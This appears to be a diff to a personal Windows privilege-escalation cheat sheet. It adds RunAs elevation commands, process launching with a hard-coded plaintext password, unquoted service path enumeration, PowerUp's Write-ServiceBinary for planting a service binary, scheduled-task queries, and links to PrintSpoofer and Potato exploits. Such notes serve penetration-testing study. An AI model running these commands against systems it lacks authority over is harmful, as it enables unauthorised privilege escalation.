@@ -1,6 +1,23 @@
 # Escalation
 
-Cli escalation in current directory: `powershell.exe -Command "Start-Process cmd \"/k cd /d %cd%\" -Verb RunAs"`
+Cli escalation in current directory:
+```
+powershell.exe -Command "Start-Process cmd \"/k cd /d %cd%\" -Verb RunAs"
+```
+
+Other user authentication: https://stackoverflow.com/questions/28989750/running-powershell-as-another-user-and-launching-a-script
+```
+Start-Process powershell.exe -Credential “domain\username” -NoNewWindow -ArgumentList “Start-Process powershell.exe -Verb runAs”
+```
+
+```
+$username = 'user'
+$password = 'password'
+
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Start-Process Notepad.exe -Credential $credential
+```
 
 ## Info
 
@@ -136,7 +153,27 @@ powershell -ep bypass
 Get-ModifiableServiceFile
 ```
 
+### Unquoted service path
 
+```
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+icacls c:\all\the\paths
+Get-UnquotedService
+Write-ServiceBinary -name 'vulnerablepathservice' -path "C:\unquoted path\"
+```
+
+## Other components
+
+### Scheduled tasks
+
+```
+schtasks /query /fo LIST /v
+```
+
+### Exploits
+
+- https://github.com/itm4n/PrintSpoofer
+- https://jlajara.gitlab.io/Potatoes_Windows_Privesc
 
 
 
